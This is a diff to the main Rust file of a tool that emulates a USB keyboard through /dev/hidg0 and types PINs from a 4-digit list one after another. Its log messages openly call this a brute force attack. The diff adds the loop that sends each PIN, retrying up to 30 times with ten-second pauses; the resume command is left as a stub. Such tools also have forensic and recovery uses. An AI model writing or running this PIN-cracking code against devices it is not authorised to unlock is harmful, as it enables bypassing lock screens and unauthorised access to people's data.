@@ -1,42 +1,13 @@
-use clap::{ArgAction, Args, Parser, Subcommand};
-use log::LevelFilter;
+use clap::Parser;
+use common::{parse_cli_args, Cli, Commands, ResumeArgs, Settings, KEYBOARD_DEVICE};
+use log::{debug, error, info, trace, warn, LevelFilter};
 use simple_logger::SimpleLogger;
-use std::process::exit;
+use std::{process::exit, thread, time};
 
+mod common;
 mod hid_ops;
 mod key_map;
 mod pin_lists;
-
-static KEYBOARD_DEVICE: &str = "/dev/hidg0";
-
-#[derive(Parser)]
-#[command(author, version, about, long_about = None, arg_required_else_help = true)]
-struct Cli {
-    #[command(subcommand)]
-    command: Option<Commands>,
-
-    /// Optional device file to use. Defaults to: /dev/hidg0
-    #[arg(short, long)]
-    device: Option<String>,
-
-    /// Turn debugging information on
-    #[arg(short, long, action = ArgAction::Count)]
-    verbose: u8,
-}
-
-#[derive(Subcommand)]
-enum Commands {
-    /// starts brute force attack
-    Start,
-    /// resumes brute force attack
-    Resume(ResumeArgs),
-}
-
-#[derive(Args)]
-struct ResumeArgs {
-    /// pin to resume from
-    pin: String,
-}
 
 fn main() {
     let cli = Cli::parse();
@@ -50,34 +21,55 @@ fn main() {
 
     logger.env().init().unwrap();
 
-    log::debug!("Starting app...");
+    let settings = parse_cli_args(&cli);
+
+    debug!("Starting app...");
 
     match cli.command {
-        Some(Commands::Start) => start(),
-        Some(Commands::Resume(args)) => resume(args),
+        Some(Commands::Start) => start(settings),
+        Some(Commands::Resume(args)) => resume(settings, args),
         None => {
-            log::error!("No command provided. Use --help for usage information.");
+            error!("No command provided. Use --help for usage information.");
             exit(1);
         }
     }
 
-    log::debug!("Finished app...");
+    debug!("Finished app...");
 }
 
-fn start() {
-    log::info!("Starting brute force attack...");
-    let result = hid_ops::write_to_device_file(KEYBOARD_DEVICE, "Hello World");
-    match result {
-        Ok(_) => log::info!("Brute force attack complete"),
-        Err(e) => log::error!("Failed to start brute force attack: {}", e),
+fn start(settings: Settings) {
+    info!("Starting brute force attack...");
+
+    let mut cool_down_index = 0;
+
+    for pin in pin_lists::PIN_LIST_4 {
+        let mut result = hid_ops::write_to_device_file(KEYBOARD_DEVICE, pin);
+        let mut attempts = 30;
+
+        while let Err(e) = result {
+            attempts -= 1;
+            warn!("Failed to send pin: {}", pin);
+            debug!("Attempts remaining: {}", attempts);
+            trace!("Error: {}", e);
+
+            if attempts == 0 {
+                error!("30 failed attempts, exiting...");
+                exit(126); // Command invoked cannot execute
+            }
+
+            // Wait for 10 seconds before trying again
+            thread::sleep(time::Duration::from_millis(10000));
+
+            result = hid_ops::write_to_device_file(KEYBOARD_DEVICE, pin);
+        }
     }
 }
 
-fn resume(args: ResumeArgs) {
-    log::info!("Resuming brute force attack from pin: {}", args.pin);
-    let result = hid_ops::write_to_device_file(KEYBOARD_DEVICE, "Hello World");
-    match result {
-        Ok(_) => log::info!("Brute force attack complete"),
-        Err(e) => log::error!("Failed to start brute force attack: {}", e),
-    }
+fn resume(settings: Settings, args: ResumeArgs) {
+    info!("Resuming brute force attack from pin: {}", args.pin);
+    // let result = hid_ops::write_to_device_file(KEYBOARD_DEVICE, "Hello World");
+    // match result {
+    //     Ok(_) => info!("Brute force attack complete"),
+    //     Err(e) => error!("Failed to start brute force attack: {}", e),
+    // }
 }
